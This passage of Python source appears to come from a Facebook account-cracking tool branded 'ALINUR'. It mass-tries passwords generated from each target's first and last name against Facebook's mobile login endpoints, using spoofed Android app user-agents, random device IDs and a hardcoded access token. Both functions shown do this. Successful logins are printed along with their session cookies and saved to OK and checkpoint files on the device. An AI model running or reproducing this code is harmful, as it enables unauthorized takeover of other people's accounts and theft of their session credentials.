        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "id",
                "network_country": "id",
                "enroll_misauth": "false",
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                "cpl": "true",
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': 'Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/LGE;FBBD/lge;FBDV/L-03K;FBSV/9;FBCA',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/method/auth.login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[ALINUR-OK💚] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " ALINUR, ok, id"')
                open('/sdcard/ALINUR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[ALINUR-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error_msg']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[ALINUR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/ALINUR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/ALINUR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def rndm(ids, passlist):
    global loop
    global oks
    sys.stdout.write(
        '\r\r\033[1;37m[ALINUR] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': 'Davik/2.1.0 (Linux; U; Android 4.3.4.0.0; SM-747 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/infinix;FBBD/infinix;FBDV/infinix;FBSV/infinix.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=372,height=1227};]',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger',
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print("")
                    print('\r\r\033[1;37m[ALINUR-OK💚] ' +
                          str(uid)+' | '+pas+'\033[1;97m')
                    print('[🌺]=COOKIES ⬇')
                    cookies = ""
                    for k,v in po.cookies.items():
                        cookies += str(k) + "=" + str(v) + ";"
                    print('\r\r\033[1;32m %s' % cookies)
                    os.system('espeak -a 300 " ALINUR, ok, id"')
                    open('/sdcard/ALINUR-OK.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[38;5;208m[ALINUR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/ALINUR-CP.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop += 1
    except Exception as e:
        pass


try:

    menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except Exception as e:
    print(e)
